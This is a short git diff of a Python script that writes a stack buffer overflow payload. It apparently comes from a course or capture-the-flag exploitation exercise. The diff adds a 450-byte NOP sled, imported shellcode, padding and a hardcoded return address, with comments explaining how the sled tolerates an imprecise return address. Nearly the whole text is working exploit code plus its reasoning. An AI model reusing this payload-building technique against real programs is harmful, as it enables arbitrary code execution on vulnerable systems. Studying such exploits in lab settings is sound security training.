@@ -4,9 +4,10 @@ import sys
 
 from shellcode import shellcode
 #sys.stdout.buffer.write(b'A'*10)
-
-sys.stdout.buffer.write(b'0x90' + (0x70-56)*b'A'+shellcode+(8*b'A')+(0x7ffffff6d110).to_bytes(8,"little"))
-
+# 1024
+# 900 noops --> go to middle (450) --> shellcode (54)
+sys.stdout.buffer.write(b'\x90'*450 + shellcode + (70)*b'A' + (8*b'A')+(0x7ffffff6d110).to_bytes(8,"little"))
+# return to middle of noop sled
 # adding a big noop sled before the shellcode so the return address doesn’t have to be super precise
 # can no longer write the return address into it bc we don't know the exact offset
 # aren't subtracting 54 bc we have 2 byte noop --> subtracting 56
